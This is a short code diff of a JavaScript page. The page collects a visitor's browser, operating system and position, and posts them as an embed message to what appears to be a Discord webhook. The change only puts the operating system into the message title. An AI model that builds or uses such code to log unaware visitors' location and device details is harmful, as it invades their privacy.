@@ -86,6 +86,8 @@
                 longitude: positionData.longitude
             };
 
+            const deviceName = deviceData.operatingSystem;
+
             infoDiv.innerHTML = `
                 <p><strong>Browser:</strong> ${deviceData.browser}</p>
                 <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
@@ -107,7 +109,7 @@
                     },
                     body: JSON.stringify({
                         embeds: [{
-                            title: 'Device Data Panel',
+                            title: `(${deviceName}) Device Data`,
                             color: 16711680, // Red color
                             fields: [
                                 { name: 'Browser', value: deviceData.browser, inline: false },
